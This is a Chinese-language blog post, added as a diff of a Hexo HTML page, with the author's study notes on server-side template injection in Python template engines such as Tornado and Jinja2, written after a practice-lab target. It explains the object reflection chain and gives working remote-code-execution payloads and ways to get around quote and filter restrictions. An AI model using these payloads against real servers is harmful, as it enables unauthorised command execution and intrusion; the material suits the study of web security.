@@ -1,0 +1,1210 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://1t01x1w4.github.io';</script>
+  
+  <title>
+    记SSTI模板注入 |
+    
+    淋着雨
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="../../../../css/loader.css">
+
+  
+  
+    <meta name="description" content="最近打靶机碰到一个 Tornado 框架的模板注入，之前只接触过一点皮毛，知道用().__class__.__bases__().__subclasses__()列出当前类的根类下的所有子类，但是接下来该怎么构造payload一窍不通了。本文旨在记录SSTI模板注入的原理、如何构造payload以及绕过手法等，方便复习查看。 什么是 SSTISSTI，即服务端模板注入（Server-Side Te">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记SSTI模板注入">
+<meta property="og:url" content="http://1t01x1w4.github.io/2026/07/19/%E8%AE%B0SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="淋着雨">
+<meta property="og:description" content="最近打靶机碰到一个 Tornado 框架的模板注入，之前只接触过一点皮毛，知道用().__class__.__bases__().__subclasses__()列出当前类的根类下的所有子类，但是接下来该怎么构造payload一窍不通了。本文旨在记录SSTI模板注入的原理、如何构造payload以及绕过手法等，方便复习查看。 什么是 SSTISSTI，即服务端模板注入（Server-Side Te">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-19T06:51:02.000Z">
+<meta property="article:modified_time" content="2026-07-19T09:25:27.464Z">
+<meta property="article:author" content="淋着雨">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+  
+  
+  
+    <link rel="shortcut icon" href="../../../../images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="../../../../css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="../../../../index.html">主页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="../../../../archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="../../../../friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/bannner.webp" alt="记SSTI模板注入">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">记SSTI模板注入</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SSTI"><span class="toc-number">1.</span> <span class="toc-text">什么是 SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%EF%BC%9APython-%E5%AF%B9%E8%B1%A1%E5%8F%8D%E5%B0%84%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">核心原理：Python 对象反射链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-%E9%80%9A%E7%94%A8%E6%8E%A8%E5%AF%BC%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">payload 通用推导流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%A1%AE%E8%AE%A4%E5%BC%95%E6%93%8E%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.</span> <span class="toc-text">第一步：确认引擎类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0%E6%8A%B5%E8%BE%BE-object-%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-number">3.2.</span> <span class="toc-text">第二步：构造抵达 object 的路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E4%BB%8E%E5%AD%90%E7%B1%BB%E5%88%97%E8%A1%A8%E4%B8%AD%E5%AE%9A%E4%BD%8D%E4%B8%89%E7%B1%BB%E9%BB%84%E9%87%91%E7%9B%AE%E6%A0%87"><span class="toc-number">3.3.</span> <span class="toc-text">第三步：从子类列表中定位三类黄金目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-RCE-%E8%BD%BD%E8%8D%B7"><span class="toc-number">3.4.</span> <span class="toc-text">第四步：构造 RCE 载荷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A%E5%BC%95%E5%8F%B7%E5%B5%8C%E5%A5%97%E4%B8%8E%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">注意点：引号嵌套与特殊字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%85%E5%AE%B9%E5%85%B3%E7%B3%BB"><span class="toc-number">4.1.</span> <span class="toc-text">三种引号的包容关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%81-%E3%80%81-%E7%A0%B4%E5%9D%8F-Tornado-%E8%A7%A3%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">&gt;、&amp;、|破坏 Tornado 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5"><span class="toc-number">4.3.</span> <span class="toc-text">四种绕过策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%B8%A9%E5%9D%91"><span class="toc-number">5.</span> <span class="toc-text">常见踩坑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins-%E6%98%AF-dict-%E8%BF%98%E6%98%AF-module%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">__builtins__是 dict 还是 module？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-%E6%B2%A1%E5%9B%9E%E6%98%BE-%E2%89%A0-payload-%E5%A4%B1%E8%B4%A5"><span class="toc-number">5.2.</span> <span class="toc-text">curl 没回显 ≠ payload 失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4-RCE-%E4%BD%86-shell-%E4%B8%8D%E5%9B%9E%E6%9D%A5"><span class="toc-number">5.3.</span> <span class="toc-text">确认 RCE 但 shell 不回来</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9F%E6%9F%A5"><span class="toc-number">6.</span> <span class="toc-text">速查</span></a></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <div class="sidebar-author-name">淋着雨</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="主页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">主页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-记SSTI模板注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-07-19T06:51:02.000Z" itemprop="datePublished">2026-07-19</time>
+    <time style="display: none;" id="post-update-time">2026-07-19</time>
+  </span>
+  
+</div>
+
+      
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>最近打靶机碰到一个 Tornado 框架的模板注入，之前只接触过一点皮毛，知道用<code>().__class__.__bases__().__subclasses__()</code>列出当前类的根类下的所有子类，但是接下来该怎么构造payload一窍不通了。本文旨在记录SSTI模板注入的原理、如何构造payload以及绕过手法等，方便复习查看。</p>
+<h2 id="什么是-SSTI"><a href="#什么是-SSTI" class="headerlink" title="什么是 SSTI"></a>什么是 SSTI</h2><p>SSTI，即服务端模板注入（Server-Side Template Injection），本质是用户输入被模板引擎当作代码执行了。例如当提交<code>&#123;&#123;7*7&#125;&#125;</code>时，正常的模板引擎应该把它当作字符串原样渲染，但存在 SSTI 时引擎会解析<code>&#123;&#123; &#125;&#125;</code>里的表达式，执行<code>7*7</code>在页面输出“49”。</p>
+<p>Python生态里常见的模板引擎有Tornado、Jinja2（Flask）、Mako、Django和Template。其中 Tornado 和 Mako 自由度最高——<code>&#123;&#123; &#125;&#125;</code>里直接写Python，链式反射调用基本不设限。Jinja2 有沙箱，需要绕过滤。Django 最严，往往得靠 Tag 注入而非表达式注入。</p>
+<h2 id="核心原理：Python-对象反射链"><a href="#核心原理：Python-对象反射链" class="headerlink" title="核心原理：Python 对象反射链"></a>核心原理：Python 对象反射链</h2><p>SSTI的最终目标是远程命令执行（RCE）。Python 的对象模型是这样的：“一切皆对象，每个对象都“记得”自己属于哪个类、继承自哪个父类、定义在哪个模块”。因此在 Python 里，从任意一个无害的内置对象出发，可以通过魔术属性一路追溯到能执行命令的函数。</p>
+<p>下面是一条典型的攻击链：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[N].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;&#x27;&#x27;任意Python代码&#x27;&#x27;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>链的每一环：</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>表达式</th>
+<th>得到的结果</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>()</code></td>
+<td>空元组对象</td>
+<td>任意内置类型都可以当起点</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>.__class__</code></td>
+<td><code>&lt;class &#39;tuple&#39;&gt;</code></td>
+<td>拿到这个对象所属的类</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>.__bases__[0]</code></td>
+<td><code>&lt;class &#39;object&#39;&gt;</code></td>
+<td>拿到父类，所有内置类型的直接父类都是 object</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>.__subclasses__()</code></td>
+<td><code>[type, weakref, int, ...]</code></td>
+<td>展开 Python 进程中所有已加载的 object 子类</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>[N]</code></td>
+<td><code>&lt;class &#39;os._wrap_close&#39;&gt;</code></td>
+<td>从列表中挑出能利用的那个类</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>.__init__</code></td>
+<td><code>&lt;function __init__&gt;</code></td>
+<td>获取该类的构造函数（function 对象）</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>.__globals__</code></td>
+<td><code>&#123;&#39;popen&#39;: ..., &#39;__builtins__&#39;: ...&#125;</code></td>
+<td>获取该函数所在模块的全局命名空间</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>[&#39;__builtins__&#39;]</code></td>
+<td><code>&#123;&#39;eval&#39;: ..., &#39;exec&#39;: ...&#125;</code></td>
+<td>拿出内置函数字典</td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>[&#39;eval&#39;]</code></td>
+<td><code>&lt;built-in function eval&gt;</code></td>
+<td>拿到 eval</td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>(&#39;&#39;&#39;...&#39;&#39;&#39;)</code></td>
+<td>—</td>
+<td>传入要执行的 Python 代码</td>
+</tr>
+</tbody></table>
+<p>为什么<code>__globals__</code>是关键？Python 中每个 function 对象都有一个<code>__globals__</code>属性，指向<strong>定义该函数时所在模块的全局命名空间字典</strong><code>os._wrap_close</code>这个类定义在 os 模块里，所以它的<code>__init__.__globals__</code>就是 os 模块的”全局变量表”，这张表里有<code>popen</code>、<code>system</code>、<code>__builtins__</code>等等我们想要的一切。因此这正是整个链条中最核心的一跳：<strong>从一个无害的类跳进一个高危模块的内部</strong>。</p>
+<h2 id="payload-通用推导流程"><a href="#payload-通用推导流程" class="headerlink" title="payload 通用推导流程"></a>payload 通用推导流程</h2><h3 id="第一步：确认引擎类型"><a href="#第一步：确认引擎类型" class="headerlink" title="第一步：确认引擎类型"></a>第一步：确认引擎类型</h3><p>先用简单payload测试是否存在SSTI，以及其框架：</p>
+<table>
+<thead>
+<tr>
+<th>测试 payload</th>
+<th>回显</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td><code>49</code></td>
+<td>Python 系（Tornado &#x2F; Jinja2 &#x2F; Django）</td>
+</tr>
+<tr>
+<td><code>$&#123;7*7&#125;</code></td>
+<td><code>49</code></td>
+<td>Mako &#x2F; FreeMarker</td>
+</tr>
+<tr>
+<td><code>&#123;&#123;7*'7'&#125;&#125;</code></td>
+<td><code>7777777</code></td>
+<td>Python，语法兼容性良好</td>
+</tr>
+</tbody></table>
+<p>如果直接回显，看报错堆栈确认框架和版本。没回显的话换个语法试，或者考虑是不是做了转义输出。</p>
+<h3 id="第二步：构造抵达-object-的路径"><a href="#第二步：构造抵达-object-的路径" class="headerlink" title="第二步：构造抵达 object 的路径"></a>第二步：构造抵达 object 的路径</h3><p>可以用多种数据结构作为起点：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]            <span class="comment"># 起点：空字符串，mro 法（推荐，[1] 固定是 object）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]          <span class="comment"># 起点：空元组，bases 法</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]          <span class="comment"># 起点：空列表</span></span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]          <span class="comment"># 起点：空字典</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第三步：从子类列表中定位三类黄金目标"><a href="#第三步：从子类列表中定位三类黄金目标" class="headerlink" title="第三步：从子类列表中定位三类黄金目标"></a>第三步：从子类列表中定位三类黄金目标</h3><p><code>object.__subclasses__()</code>展开的列表取决于 Python 进程中导入了哪些模块，但以下三个类几乎是必中的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen     → 直接实例化即执行命令，最简链路</span><br><span class="line">os._wrap_close       → 通过 __globals__ 进入 os 模块，含 popen / system</span><br><span class="line">warnings.catch_warnings → 通过 __globals__ 进入 warnings 模块，含 __builtins__</span><br></pre></td></tr></table></figure>
+
+<p><strong>高效定位索引的方法</strong>：用以下payload直接让模板引擎帮你搜，返回类似<code>[(132, &#39;_wrap_close&#39;), (254, &#39;Popen&#39;), (192, &#39;catch_warnings&#39;)]</code>，索引一目了然：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [(i, c.__name__) <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()) <span class="keyword">if</span> <span class="string">&#x27;Popen&#x27;</span> <span class="keyword">in</span> c.__name__ <span class="keyword">or</span> <span class="string">&#x27;wrap_close&#x27;</span> <span class="keyword">in</span> c.__name__ <span class="keyword">or</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> c.__name__] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第四步：构造-RCE-载荷"><a href="#第四步：构造-RCE-载荷" class="headerlink" title="第四步：构造 RCE 载荷"></a>第四步：构造 RCE 载荷</h3><p>拿到索引后，有三条链路可选：</p>
+<p><strong>链路 A - subprocess.Popen（有回显）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 Popen 索引 = 254</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">254</span>](<span class="string">&#x27;id&#x27;</span>, shell=<span class="literal">True</span>, stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>链路 B — os._wrap_close → popen &#x2F; system（最常用）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 _wrap_close 索引 = 132</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;id&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>链路 C — os._wrap_close → builtins → eval &#x2F; exec（终极链，反弹 shell 首选）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;&#x27;&#x27;__import__(&#x27;os&#x27;).system(&#x27;命令&#x27;)&#x27;&#x27;&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐链路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>只想看 <code>whoami</code> &#x2F; <code>id</code> 回显</td>
+<td>链路 B，<code>popen().read()</code></td>
+</tr>
+<tr>
+<td>要反弹 shell</td>
+<td>链路 C，<code>eval()</code> + 三重引号</td>
+</tr>
+<tr>
+<td>Python 版本老（&lt; 3.6）</td>
+<td>链路 A，<code>Popen</code> 直连</td>
+</tr>
+</tbody></table>
+<h2 id="注意点：引号嵌套与特殊字符"><a href="#注意点：引号嵌套与特殊字符" class="headerlink" title="注意点：引号嵌套与特殊字符"></a>注意点：引号嵌套与特殊字符</h2><p><strong>cmd 命令需要引号，Python 代码也需要引号，而模板解析器以<code>&#125;&#125;</code>为唯一终结符</strong>——中间的字符一旦被误读，整个表达式解析失败。</p>
+<h3 id="三种引号的包容关系"><a href="#三种引号的包容关系" class="headerlink" title="三种引号的包容关系"></a>三种引号的包容关系</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">外层单引号 &#x27;...&#x27;   → 内部可用双引号 &quot; ，不可用单引号 &#x27;</span><br><span class="line">外层双引号 &quot;...&quot;   → 内部可用单引号 &#x27; ，不可用双引号 &quot;</span><br><span class="line">外层三重引号 &#x27;&#x27;&#x27;...&#x27;&#x27;&#x27; → 内部单双引号通吃，唯独不能出现三个连续单引号</span><br></pre></td></tr></table></figure>
+
+<p>真实命令往往同时包含<code>&#39;</code>和<code>&quot;</code>，比如反弹 shell 命令：外层<code>os.system(&#39;...&#39;)</code>用单引号，里面<code>bash -c &quot;...&quot;</code>用双引号。这种情况只有<strong>三重引号</strong>能兜住。</p>
+<h3 id="、-、-破坏-Tornado-解析"><a href="#、-、-破坏-Tornado-解析" class="headerlink" title="&gt;、&amp;、|破坏 Tornado 解析"></a><code>&gt;</code>、<code>&amp;</code>、<code>|</code>破坏 Tornado 解析</h3><p>这些字符在 Tornado 模板里可能被当成模板语法的一部分，导致<code>ParseError</code>。那么就不要直接在模板表达式里拼 shell 命令，而是用<code>eval()</code>把整条命令写成 Python 字符串，从而使<code>&gt;</code>、<code>&amp;</code>等变成字符串内部的普通文本，不再干扰模板解析。</p>
+<h3 id="四种绕过策略"><a href="#四种绕过策略" class="headerlink" title="四种绕过策略"></a>四种绕过策略</h3><ol>
+<li><strong>三重引号（首选）</strong>：<code>eval(&#39;&#39;&#39;...&#39;&#39;&#39;)</code>，能够处理95%的场景</li>
+<li><strong>hex 转义</strong>：<code>\x27</code>替代<code>&#39;</code>，<code>\x22</code>替代<code>&quot;</code>，字符不多时可用</li>
+<li><strong>chr() 拼接</strong>：<code>chr(105)+chr(100)</code>拼出<code>id</code>，仅在 WAF 拦截所有引号时用</li>
+<li><strong>拆分执行</strong>：先把命令 base64 写入文件，再执行文件，用于命令中含<code>&gt;</code>、<code>&amp;</code>、<code>|</code>等 shell 元字符的情况</li>
+</ol>
+<h2 id="常见踩坑"><a href="#常见踩坑" class="headerlink" title="常见踩坑"></a>常见踩坑</h2><h3 id="builtins-是-dict-还是-module？"><a href="#builtins-是-dict-还是-module？" class="headerlink" title="__builtins__是 dict 还是 module？"></a><code>__builtins__</code>是 dict 还是 module？</h3><p>不同执行上下文中<code>__builtins__</code>类型不同：</p>
+<ul>
+<li>在<code>__main__</code>模块中：<code>builtins</code>模块对象 → 访问属性用<code>.eval</code>或<code>.__dict__[&#39;eval&#39;]</code></li>
+<li>在其他模块（如 os）中：<code>builtins.__dict__</code>（一个 dict）→ 直接<code>[&#39;eval&#39;]</code>索引</li>
+</ul>
+<p>遇到<code>TypeError: &#39;module&#39; object is not subscriptable</code>就换<code>.__dict__[&#39;eval&#39;]</code>或<code>.eval</code>。</p>
